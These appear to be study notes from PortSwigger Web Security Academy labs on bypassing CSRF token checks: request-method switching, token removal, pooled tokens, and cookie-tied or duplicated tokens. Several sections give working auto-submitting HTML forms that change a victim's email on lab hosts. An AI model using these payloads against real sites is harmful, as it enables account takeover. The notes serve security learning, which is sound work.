### When it depends on Request Method

Sometimes, the CSRF Token is validated only on POST requests. Conversion to a GET request can bypass it.
```HTML
<form action = "https://0a35002603a3d5fc80510365008a00c8.web-security-academy.net/my-account/change-email?email="test@test.test"" method = "GET">
<input type = "hidden" value = "test@tt.k" name = "email">
</form>
<script>
document.forms[0].submit();
</script>
```

### When it depends on Presence

Sometimes the token is validated only if present. So remove it completely.

```HTML
<form action = "https://0a35002603a3d5fc80510365008a00c8.web-security-academy.net/my-account/change-email" method = "POST">
<input type = "hidden" value = "test@tt.k" name = "email">
<!--<input type = "hidden" value = "token" name = "csrf">-->
</form>
<script>
document.forms[0].submit();
</script>
```

### Ownership of Token is not verified

There is a global pool of tokens, just checks if the token is part of it. Does not check if the token belongs to the correct user. Just use our CSRF token on the victim.


### Tying to a Non-Session Cookie

Apps that use different frameworks might use one cookie for session ID, and another for CSRF protection, which aren't linked together. The request might look like
```HTTP Request
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF;
csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

The exploit:

This also involves cookie injection, as the csrf key has to be injected to the victim.
So, the exploit page has something like
```HTML
<form action = "https://0a35002603a3d5fc80510365008a00c8.web-security-academy.net/my-account/change-email" method = "POST">
<input type = "hidden" value = "test@tt.k" name = "email">
<input type = "hidden" value = "token" name = "csrf">
</form>
<img src = "cookie-injection-url" onerror = "document.forms[0].submit()"
```
### Simply Duplicated Cookie
Some apps just clone the CSRF key to create the token.
The same exploit as above can be used again.
